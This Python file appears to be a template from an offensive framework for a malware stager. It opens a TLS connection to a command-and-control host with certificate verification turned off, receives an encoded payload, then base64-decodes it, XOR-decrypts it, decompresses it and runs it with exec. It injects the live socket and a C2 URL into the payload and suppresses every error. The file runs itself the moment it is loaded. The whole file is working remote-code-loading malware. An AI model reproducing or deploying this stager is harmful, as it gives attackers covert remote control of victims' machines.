import types
import ssl
import base64
import zlib
import socket

# --- FRAMEWORK TEMPLATE VARIABLES ---
# These will be replaced by the generator
HOST = "127.0.0.1"
PORT = 5000
KEY = "SuperSploitKey" # XOR key for payload decryption
C2_URL = "http://127.0.0.1:8000" # Dynamic C2 URL for beaconing

class Stager:
    def __init__(self, host, port, key, c2_url):
        self.host = host
        self.port = port
        self.key = key
        self.c2_url = c2_url
        self.client_socket = None
        self.connect()

    def connect(self):
        try:
            # Create a raw socket
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Create a default SSL context
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE # Disable certificate verification for simplicity in stager
            
            # Wrap the raw socket with SSL
            self.client_socket = ssl_context.wrap_socket(raw_socket, server_hostname=self.host)
            self.client_socket.connect((self.host, self.port))
            
            # Receive and execute the payload
            payload_data = self.receive_payload()
            # Validate framework magic bytes ('SS') to ensure it is our Stage 2 payload
            if payload_data and payload_data.startswith(b"\x53\x53"):
                self.execute_payload(payload_data[2:])
        except Exception:
            # Silent failure on connection or payload execution errors
            pass
        finally:
            self.cleanup()

    def receive_payload(self):
        try:
            # Receive 4-byte length prefix
            length_raw = self._recv_all(4)
            if not length_raw:
                return None
            length = int.from_bytes(length_raw, 'big')

            # Receive the actual payload data
            return self._recv_all(length)
        except Exception:
            return None


    def _recv_all(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.client_socket.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)

    def execute_payload(self, obfuscated_payload):
        try:
            # Base64 decode
            decoded_payload = base64.b64decode(obfuscated_payload)
            
            # XOR decrypt
            decrypted_payload = bytes([x_byte ^ ord(self.key[i % len(self.key)]) for i, x_byte in enumerate(decoded_payload)])
            
            # Decompress (if compressed)
            try:
                decompressed_payload = zlib.decompress(decrypted_payload)
            except zlib.error:
                # If decompression fails, assume it wasn't compressed
                decompressed_payload = decrypted_payload

            # Create a new module to execute the payload in
            module_name = "python3_payload"
            payload_module = types.ModuleType(module_name)
            payload_module.__dict__['client_socket'] = self.client_socket # Inject the socket into the payload's namespace
            payload_module.__dict__['XOR_KEY'] = self.key # Inject encryption key for C2 stream
            
            # Inject dynamic networking variables just like the DRS payload
            payload_module.__dict__['LHOST'] = self.host
            payload_module.__dict__['LPORT'] = self.port
            payload_module.__dict__['C2_URL'] = self.c2_url

            # Execute the payload
            compiled_code = compile(decompressed_payload, '<string>', 'exec')
            exec(compiled_code, payload_module.__dict__)
        except Exception:
            pass # Silent failure

    def cleanup(self):
        """Silent cleanup."""
        try:
            if self.client_socket:
                self.client_socket.close()
        except Exception:
            pass

# The generator will create the final stager script, which will instantiate and run the Stager class.
# This template itself is not directly executable without variable replacement.
# Auto-instantiate to trigger the connection
Stager(HOST, PORT, KEY, C2_URL)
